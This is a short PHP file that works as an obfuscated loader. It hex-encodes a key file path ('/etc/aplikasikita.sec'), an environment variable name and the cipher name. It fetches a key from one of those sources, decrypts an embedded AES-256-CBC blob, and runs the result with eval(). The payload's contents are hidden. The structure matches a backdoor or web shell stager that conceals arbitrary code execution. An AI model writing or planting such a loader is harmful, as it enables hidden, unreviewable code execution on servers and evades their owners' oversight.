<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('mIc30Pfx6ejPbnPGHpyPvg==');

$c=base64_decode(

'qDEeMlwJDIId+10nPL2p1idgqe+87EGzrxgZ1hZS/oLso6vHtEVYmyYOSXXVr1wNFxjUqL6bPqJK' .
'aeerqWpvuEwGkwN7Ps8BrQriA1xnVWYtC0wVC/l1mQOsrq68/949oRxaEYnWlK3rCK3rb3GUFQjl' .
'5KFzWdMBLOfhRuMvRnQK6tZvI9s/0l9vUiFqlh01MNsTsVaZ5NAU8yv8N8yNXtPxJNTGgKFM/muQ' .
'0iTD89lPiBRfVE0fB/PgySmdlJth5j/x0mcSt/PVpBCiRiCULvSbtUFzurDdQtY3/ExtkGPogist' .
'utdfbMO59FT9o0rpKGVPKS7hflS4nThbZKWL0j+w2KFG3LeogFlYp6gtEpKJ9luGBbQ8ZjeECZkD' .
'/BGTZKtceuBcsv9UsPaleNsIZ9nY1eGKrZ/PRByL/LC0K8qfYp3TTuRz1oGY8JIYiTeixooaMbq9' .
'QZCoge6O4snm8OIll641KZU5lCCNhlai7keNZMgDFWZEOx4ZKPsW3JBuP89idUP3oDQepURqADQp' .
'OendtYNGkKmILGLRznogfD0='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

